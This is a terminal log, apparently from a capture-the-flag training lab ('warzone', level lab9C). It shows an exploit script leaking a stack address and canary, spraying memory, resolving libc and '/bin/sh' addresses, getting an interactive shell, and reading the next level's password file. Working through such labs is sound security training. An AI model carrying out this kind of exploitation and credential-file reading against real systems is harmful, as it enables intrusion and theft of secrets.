```sh
lab9C@warzone:~$ python /var/tmp/exploit.py
[+] Opening connection to 127.0.0.1 on port 9943: Done
Press Enter...
wynik = -1219805187
Leak stack address: 0xb74b3ffd
Leak canary: 0xcf55200
Start spraying
End spraying
leak_canary (int): 217403904
libc_address: 0xb74e1190
bin_sh__address: 0xb7601a24
[*] Switching to interactive mode
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice: $ cat /home/lab9A/.pass
1_th0uGht_th4t_w4rn1ng_wa5_l4m3
[*] Got EOF while reading in interactive
$
```
